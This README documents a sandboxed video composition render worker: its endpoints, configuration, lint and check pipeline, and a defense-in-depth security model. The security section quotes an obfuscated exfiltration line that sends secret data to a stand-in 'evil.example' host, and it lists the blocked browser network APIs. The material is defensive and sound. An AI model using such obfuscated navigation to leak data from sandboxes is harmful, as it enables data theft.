# `@memberjunction/video-studio-render-worker`

Stateless, sandboxed composition render worker for MemberJunction Video Studio. It accepts a `RenderProjectBundle` over HTTP (`RENDER_WORKER_ROUTES`), enforces a strict Content Security Policy (`COMPOSITION_CSP`) and static lint gate (`RunLintGate`), injects the deterministic `window.MJVideo` runtime preamble (`InjectPreambleIntoHtml`), runs deterministic quality checks (`RunCheckJob`), and renders HTML/CSS/SVG/GSAP/Canvas compositions via HyperFrames (`hyperframes`, `@hyperframes/producer`, `@hyperframes/engine`, `@hyperframes/lint`, `@hyperframes/core`, `@hyperframes/parsers`, `@hyperframes/studio-server` pinned at `0.8.134`) and `ffmpeg`.

This package has **no** dependency on `@memberjunction/core`, `@memberjunction/core-entities`, or any database driver, and holds no vendor or database credentials.

## Endpoints

| Method | Path | Description |
| --- | --- | --- |
| `GET` | `/health` | Probes HyperFrames, `ffmpeg`, `ffprobe`, and Chromium; returns `200` (`Healthy: true`) or `503` (`Healthy: false`). Requires `Authorization: Bearer <token>` when `VIDEO_STUDIO_RENDER_TOKEN` is set. |
| `POST` | `/check` | Runs the deterministic check pipeline: RND-1 security/lint gate → static authored-file checks → preamble + default fonts → `hyperframes check --json` CLI audit → in-page DOM text measurements (`SampleTimestampsSeconds ?? [0]`) and DOM rules. A lint-blocked bundle returns lint issues immediately without launching Chromium. |
| `POST` | `/render` | Validates, lints, injects the CSP + `window.MJVideo` preamble, renders an H.264/AAC MP4 (`yuv420p`, `+faststart`), streams `RenderStreamEvent` NDJSON lines, and stores the MP4 for one-shot retrieval at `/videos/<VideoID>`. |
| `GET` | `/videos/<VideoID>` | Streams a rendered MP4 (`video/mp4`) once and removes it from the ephemeral video store. |
| `POST` | `/stills` | Captures still frames (`png` or `jpeg`) across `Points` in a single Chromium session. |
| `POST` | `/contact-sheet` | Builds a contact sheet grid (and optional `TransitionStrip`) from captured stills in a single Chromium session. |
| `POST` | `/keyframes` | Extracts scene-change (`0.3` threshold) and uniform-sample keyframes from a base64 MP4 via `ffmpeg` / `ffprobe` (default `MaxFrames`: `16`). |

## Environment Variables (`RENDER_WORKER_ENV`)

| Variable | Default | Description |
| --- | --- | --- |
| `VIDEO_STUDIO_RENDER_HOST` | `127.0.0.1` (`0.0.0.0` in Docker) | Bind address for the HTTP server. |
| `VIDEO_STUDIO_RENDER_PORT` | `0` (`8080` in Docker) | Bind port (`0` selects an ephemeral OS port and prints `VIDEO_STUDIO_RENDER_WORKER_PORT=<port>` on `stdout`). |
| `VIDEO_STUDIO_RENDER_TOKEN` | *(unset)* | Shared bearer token required on **every** route (including `GET /health`) when set. **Required** whenever `VIDEO_STUDIO_RENDER_HOST` is not a loopback address (`127.0.0.1`, `::1`, `localhost`). |
| `VIDEO_STUDIO_RENDER_MAX_BODY_MB` | `256` | Maximum JSON request body size in megabytes (`413 BodyTooLarge` when exceeded while streaming). |
| `VIDEO_STUDIO_RENDER_CONCURRENCY` | `1` | Maximum concurrent heavy jobs (`/render`, `/stills`, `/contact-sheet`, `/check`, `/keyframes`); excess requests wait in a FIFO queue. |
| `VIDEO_STUDIO_RENDER_MAX_TIMEOUT_MS` | `1800000` (30 min) | Hard ceiling for `/render` jobs (`min(req.TimeoutMs, VIDEO_STUDIO_RENDER_MAX_TIMEOUT_MS)`). Non-render routes time out after 5 minutes (`300000` ms). |
| `VIDEO_STUDIO_RENDER_ALLOW_ROOT` | `false` | Refuses to start when running as `uid === 0` unless set to `1` or `true`. |

Optional browser/telemetry overrides read by the backend:
- `CHROME_PATH` / `PUPPETEER_EXECUTABLE_PATH` / `PUPPETEER_CACHE_DIR`: Path to the pinned `chrome-headless-shell` binary or Puppeteer cache directory.
- `DO_NOT_TRACK=1` and `HYPERFRAMES_NO_TELEMETRY=1`: Automatically set by the worker to prevent HyperFrames from sending usage telemetry.

### Token & Non-Loopback Rule

- If `VIDEO_STUDIO_RENDER_HOST` is non-loopback (e.g., `0.0.0.0` inside Docker) and `VIDEO_STUDIO_RENDER_TOKEN` is empty, `CreateRenderWorkerServer` throws immediately on startup.
- When `VIDEO_STUDIO_RENDER_TOKEN` is configured, every request to every route (`GET /health`, `POST /render`, `GET /videos/<id>`, `POST /stills`, `POST /contact-sheet`, `POST /check`, `POST /keyframes`) must supply `Authorization: Bearer <token>`. Token comparison hashes both values with SHA-256 and compares the 32-byte digests via `crypto.timingSafeEqual`.

## Deterministic Check Pipeline (`RunCheckJob`)

`RunCheckJob` runs checks in order:
1. **Validate & Stage (`StageRenderBundle`)**: Validates bundle paths (`ValidateRenderBundle`), frame geometry (`ValidateRenderGeometry`), and composition `data-*` geometry alignment (`ValidateCompositionGeometryMatch`). Stages authored files into a temporary directory along with bundled SIL OFL default fonts (`Inter-Regular.ttf` aliased as `'MJ Sans'` and `JetBrainsMono-Regular.ttf` aliased as `'MJ Mono'` under `__mj_fonts/` so HyperFrames' font compiler never rewrites them to `fonts.googleapis.com`), and injects `COMPOSITION_CSP`, `<style data-mj-default-fonts>`, and the `window.MJVideo` runtime preamble on a single line (`InjectPreambleIntoHtml`) so line numbers in diagnostics match authored files.
2. **Lint Gate (`RunLintGate`)**: Scans `request.Bundle.Files` in memory (`ScanAuthoredFilesForLintIssues`: `MJ_NON_BUNDLE_URL`, `MJ_NETWORK_API`) and runs `@hyperframes/lint` (`lintProject`) against the staged directory. Note: `@hyperframes/lint`'s `lintMediaUrls` is intentionally **not** called because at `0.8.134` it issues live outbound HTTP `HEAD` requests (`fetch`) from Node, which would create an SSRF vector. If `BlockRender` is true, `RunCheckJob` returns immediately without invoking Chromium.
3. **Static Checks (`RunStaticChecks`)**: Pure authored-file checks on `request.Bundle` (`MJ_MISSING_ASSET`, `MJ_NONDETERMINISTIC_API`, `MJ_UNBOUND_LITERAL_SOURCE`). Note that `@hyperframes/lint`'s `non_deterministic_code` rule blocks raw `Math.random()` in `<script>` blocks even though the runtime preamble seeds `Math.random`; compositions and prompts should call `window.MJVideo.Random()` directly.
4. **HyperFrames CLI Audit (`backend.RunCheckCli` → `MapHyperFramesCheckOutput`)**: Runs `hyperframes check --json --no-proxy --no-browser-gpu <dir>` in a locked-down subprocess (`BuildReducedCheckCliEnv`: `env` reduced to the six-key allowlist `PATH`, `TMPDIR`, a fresh per-job `HOME`, `DO_NOT_TRACK=1`, `HYPERFRAMES_NO_TELEMETRY=1`, and `HYPERFRAMES_BROWSER_PATH`, 2-minute timeout) and maps `layout`, `contrast`, and `motion` findings (plus top-level `{"ok":false,"error":"..."}` errors as `MJ_CHECK_CLI_FAILED`).
5. **DOM Measurement & Rules (`backend.MeasureText` → `EvaluateDomRules`)**: Runs `normalizeSystemFontPrimaryFamilies` and `injectDeterministicFontFaces` (offline) on `index.html`, seeks the composition via `captureFrameToBuffer` at `SampleTimestampsSeconds ?? [0]` with bundle-only request interception (`CaptureSession.page.setRequestInterception(true)`), measures visible text nodes (using tight `Range.getClientRects()` text node union for HTML elements and `getBoundingClientRect()` for SVG `<text>`) via `BuildMeasureTextInPageScript`, and evaluates `MJ_SAFE_AREA`, `MJ_MIN_TEXT_SIZE`, `MJ_UNBOUND_LITERAL_RENDERED`, and `MJ_UNBUNDLED_FONT`.
6. **Merge, Dedupe & Sort (`DedupeCheckIssues`, `SortCheckIssues`)**: Deduplicates on `Code + Selector + File + Line` keeping the earliest `TimestampSeconds`, sorts deterministically, and sets `Passed = !Issues.some(i => i.Severity === 'Error')` and `BlockRender = !Passed`.

### Check Codes Reference

| Code | Category | Severity | Stage | Description |
| --- | --- | --- | --- | --- |
| `MJ_NON_BUNDLE_URL` | `RemoteUrl` | `Error` | Lint Gate | Relative path escaping the bundle root, non-bundle URL (`http:`, `https:`, `//`, `ws:`, `file:`, `javascript:`) in HTML, CSS, SVG, or JS, or `<script src>` / JS `import` specifier that does not resolve to an entry in `Bundle.Files`. |
| `MJ_NETWORK_API` | `RemoteUrl` | `Error` | Lint Gate | Forbidden browser network/navigation API (`fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `sendBeacon`, `RTCPeerConnection`, `importScripts`, `serviceWorker`, `window.open`, `location`, inline event handlers `on*=`, `<meta http-equiv="refresh">`, `<base>`, `<link rel="prefetch\|preconnect\|dns-prefetch\|prerender">`). |
| `MJ_MISSING_ASSET` | `MissingAsset` | `Error` | Static Checks | Bundle-relative reference in HTML, CSS, SVG, or JS that does not resolve to any entry in `Bundle.Files` or `Bundle.Assets`. |
| `MJ_NONDETERMINISTIC_API` | `Lint` | `Error` | Static Checks | Non-deterministic timer/clock API (`Date.now(`, `new Date()`, `performance.now(`, `requestAnimationFrame(`, `setTimeout(`, `setInterval(`) in composition scripts (skipping inline HTML `<script>` patterns already reported by `@hyperframes/lint` as `non_deterministic_code` or `requestanimationframe_in_composition`). |
| `MJ_UNBOUND_LITERAL_SOURCE` | `DataLiteral` | `Error` | Static Checks | Numeric literal token (`ExtractNumericLiteralTokens`) in authored HTML/SVG text outside `<script>`/`<style>` and outside `data-mj-bound` that is not in `AllowedDataLiterals`. |
| `MJ_SAFE_AREA` | `SafeArea` | `Error` | DOM Rules | Rendered text bounding box extends outside the format's safe-area insets (`SAFE_AREA_INSETS`). |
| `MJ_MIN_TEXT_SIZE` | `MinTextSize` | `Error` | DOM Rules | Rendered text `FontSizePx` is below `MIN_TEXT_SIZE_SHORT_EDGE_RATIO * Math.min(Width, Height)` (`27px` at `1080p`). |
| `MJ_UNBOUND_LITERAL_RENDERED` | `DataLiteral` | `Error` | DOM Rules | Rendered text outside `[data-mj-bound]` contains a numeric literal token not in `AllowedDataLiterals`. |
| `MJ_UNBUNDLED_FONT` | `Lint` | `Warning` | DOM Rules | Rendered text's primary computed `font-family` is neither a loaded `@font-face` in `document.fonts` nor one of the worker's bundled default fonts (`MJ Sans`, `MJ Mono`). |
| `MJ_CHECK_CLI_UNREADABLE` | `Lint` | `Warning` | CLI Audit | `hyperframes check --json` stdout was empty, malformed JSON, or missing audit sections. |
| `MJ_CHECK_CLI_FAILED` | `Lint` | `Warning` | CLI Audit | `hyperframes check` subprocess crashed, timed out, or failed to spawn. |
| `MJ_MEASURE_TEXT_FAILED` | `Lint` | `Warning` | DOM Rules | `backend.MeasureText` threw while measuring rendered DOM text. |
| `text_box_overflow`, `canvas_overflow`, `sibling_overlap`, ... | `Layout` | `Error` / `Warning` | CLI Audit | HyperFrames CLI layout audit findings mapped from `layout.findings`. |
| `contrast_aa_failure`, ... | `Contrast` | `Error` / `Warning` | CLI Audit | HyperFrames CLI WCAG contrast audit findings mapped from `contrast.findings`. |
| `jitter`, `pacing`, ... | `Lint` | `Error` / `Warning` | CLI Audit | HyperFrames CLI motion audit findings mapped from `motion.findings`. |

### Tunable DOM Check Constants (`src/checks/dom-rules.ts`)

- **`SAFE_AREA_INSETS`**: Fractional safe-area margins per `VideoFormat`:
  - `16:9`: `{ Top: 0.05, Bottom: 0.05, Left: 0.05, Right: 0.05 }`
  - `1:1`: `{ Top: 0.05, Bottom: 0.05, Left: 0.05, Right: 0.05 }`
  - `9:16`: `{ Top: 0.10, Bottom: 0.20, Left: 0.06, Right: 0.12 }`
- **`MIN_TEXT_SIZE_SHORT_EDGE_RATIO`**: `0.025` (`2.5%` of `Math.min(Width, Height)`, which equals `27px` on a `1920x1080` or `1080x1920` frame).

## Security Model & Defense in Depth

1. **Layer 1 — Path Traversal & Bundle Validation**: Every `Bundle.Files` and `Bundle.Assets` path is validated by `ValidateBundleRelativePath` before a single byte is written to disk. Absolute paths, `..` segments, Windows drive prefixes (`C:foo`), backslashes, NUL/control bytes, strict base64 violations, and case-insensitive collisions return `400 InvalidBundle`.
2. **Layer 2 — Pre-Render Static & HyperFrames Lint Gate**: `RunLintGate` combines `@hyperframes/lint` (`lintProject`) with static checks across all authored `.html`/`.htm`, `.css`, `.svg`, and script entries in `Bundle.Files` (`MJ_NON_BUNDLE_URL`, `MJ_NETWORK_API`), including HTML inline event handlers (`onerror`, `onload`, `onclick`, etc.), entity-encoded attributes, quoted `>` inside `<script>` tags, and `.css` entries in `Bundle.Files` (which a browser would execute if referenced via `<script src="s.css">`). Every raw `<script src="...">` attribute and JS `import` specifier (before entity decoding) must match `^[A-Za-z0-9._@/-]+$` with no leading `/` and resolve to an entry in `Bundle.Files` (rejecting `Bundle.Assets` or non-existent script paths). **What a static gate cannot stop**: obfuscated inline JS (e.g., `self["loc"+"ation"] = "//evil.example/?d=" + MJVideo.Data.Secret`) and `<script>` elements created dynamically at runtime (e.g., `document.createElement("script")` whose `src` is a `Bundle.Assets` entry).
3. **Layer 3 — Strict Injected CSP**: `InjectPreambleIntoHtml` injects `<meta http-equiv="Content-Security-Policy" content="default-src 'self' data: blob:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'none'; frame-src 'none'; worker-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'">` right after `<!doctype ...>` (or byte 0) into every `.html`/`.htm` file.
4. **Layer 4 — Ephemeral Staging, Non-Root Execution & Container Isolation**: Each job stages into a fresh `fs.mkdtemp` directory removed in `finally`, enforces hard timeouts and a FIFO concurrency semaphore, and refuses to run as root (`uid === 0`).
5. **Residual Gaps & Why Docker `--network none` Is Required for Untrusted Prompts (Decision 4 / D15)**:
   - **Node-side `fetch()` in `@hyperframes/producer` and the `hyperframes check` CLI**: Before Chromium or its `<meta>` CSP ever runs, `@hyperframes/producer` (`dist/index.js`) and the `hyperframes check` CLI perform outbound Node `fetch()` steps:
     1. **Google Fonts lookup (`@hyperframes/producer/dist/index.js:155439`, `injectDeterministicFontFaces`)**: For any CSS `font-family` name that does not have a matching `@font-face` rule in the bundle (including OS font names such as `Arial` or `Roboto`, which connect to `fonts.googleapis.com:443`), both the render pipeline and the `hyperframes check` CLI call Node `fetch('https://fonts.googleapis.com/css2?family=...')`.
     2. **GSAP CDN rewrite (`@hyperframes/producer/dist/index.js:162586`, `rewriteUnresolvableGsapToCdn` → `inlineExternalScripts` at `:162180`)**: For any `<script src="...">` matching `[^"']*gsap[^"']*/dist/([^"']+)` where `existsSync(path.resolve(projectDir, src))` is false, `@hyperframes/producer` rewrites the attribute to `https://cdn.jsdelivr.net/npm/gsap@3.15.0/dist/$1`, and `inlineExternalScripts` (`:162180`) fetches every `http(s)` `<script src>` from Node and inlines the response body into the page.
   - **Hardcoded `--no-sandbox` in `@hyperframes/engine`**: `@hyperframes/engine/dist/services/browserManager.js:667` (`buildChromeArgs`) launches `chrome-headless-shell` with `--no-sandbox` and `--disable-setuid-sandbox`, and the `/render` pipeline (`executeRenderJob`) does not expose a Puppeteer `page` hook for CDP request interception (whereas `CaptureStills` and `MeasureText` attach `page.setRequestInterception(true)` on `CaptureSession.page`).
   - **What `<meta http-equiv="Content-Security-Policy">` and the static gate cannot block**: Browser CSP delivered via `<meta>` cannot block top-level document navigation (`window.location = ...`, `<meta http-equiv="refresh">`), WebRTC ICE/STUN UDP traffic (`RTCPeerConnection`), or `<link rel="dns-prefetch">` DNS resolution, and standalone `.svg` documents opened directly do not inherit HTML `<meta>` CSP. While `RunLintGate` statically blocks literal `location` assignments, `<meta http-equiv="refresh">`, `RTCPeerConnection`, and `<link rel="dns-prefetch">`, a static gate cannot stop obfuscated inline JS (`self["loc"+"ation"]`) or runtime-created `<script>` elements (`createElement("script")` pointing at an Asset), and a top-level navigation on the `/render` path can carry `MJVideo.Data` out.
   - **Mitigation & Trust Boundary**: `StageRenderBundle` and `BuildDefaultFontsStyleTag` inject `@font-face` declarations for the bundled default fonts (`'MJ Sans'` and `'MJ Mono'`), and `RunLintGate` requires every raw `<script src>` and JS `import` specifier to match `^[A-Za-z0-9._@/-]+$` (no leading `/`) and resolve to an entry in `Bundle.Files`. Because static analysis cannot prevent obfuscated JS or runtime-created `<script>` navigation and `@hyperframes/producer` / `hyperframes check` can still attempt Google Fonts lookups from Node for unbundled font families, **`LocalWorker` is for trusted / development compositions only, and Docker (`--network none`, `--read-only`, `--cap-drop=ALL`, `--security-opt=no-new-privileges` in `DockerRenderDriver`, VS-RND-4) is the security boundary for untrusted content (Decision 4 / D15).**

## Prerequisites & Local Development

1. **Install pinned `chrome-headless-shell`**:
   ```bash
   cd packages/AI/VideoStudio/RenderWorker
   pnpm run browser:install
   ```
2. **Install `ffmpeg` and `ffprobe`** (required for `/render`, `/keyframes`, and `/health`):
   - **macOS**: `brew install ffmpeg`
   - **Debian / Ubuntu**: `sudo apt-get update && sudo apt-get install -y ffmpeg`
3. **Build and run tests**:
   ```bash
   # Build and run CI-safe unit tests (uses FakeRenderBackend, no browser or ffmpeg needed)
   pnpm run build
   pnpm test

   # Run opt-in end-to-end Chromium + ffmpeg render and check tests
   DO_NOT_TRACK=1 HYPERFRAMES_NO_TELEMETRY=1 VIDEO_STUDIO_RENDER_TESTS=1 pnpm test

   # Start the HTTP worker locally on an ephemeral port (prints VIDEO_STUDIO_RENDER_WORKER_PORT=<port> on stdout)
   node dist/main.js
   ```

## Docker Build & Run

> **Licensing note (Decision 8):** The runtime stage installs Debian Bookworm's `ffmpeg` package, which includes GPL-licensed components. This Docker image is for local/internal deployment and is not published to a public registry in this phase.

The image installs the exact `chrome-headless-shell` version expected by `@hyperframes/engine` into `/opt/puppeteer-cache` during the build stage, runs as non-root `USER node` (UID `1000`, compatible with any arbitrary non-root `--user uid:gid`), listens on port `8080` (`VIDEO_STUDIO_RENDER_HOST=0.0.0.0`, `VIDEO_STUDIO_RENDER_PORT=8080`), and defines `CMD ["node", "/app/dist/main.js"]` with **no `ENTRYPOINT`** so `DockerRenderDriver` (VS-RND-4) can run `sleep infinity` + `docker exec`.

```bash
# Build from the repository root
docker build -f packages/AI/VideoStudio/RenderWorker/Dockerfile -t mj-video-render-worker:local .

# Run with bearer token authentication and container hardening
docker run --rm -p 127.0.0.1:18080:8080 \
  -e VIDEO_STUDIO_RENDER_TOKEN=change-me-token \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=2g \
  --cap-drop=ALL \
  --security-opt=no-new-privileges \
  mj-video-render-worker:local

# Probe /health with the bearer token
curl -fsS -H "Authorization: Bearer change-me-token" http://127.0.0.1:18080/health
```
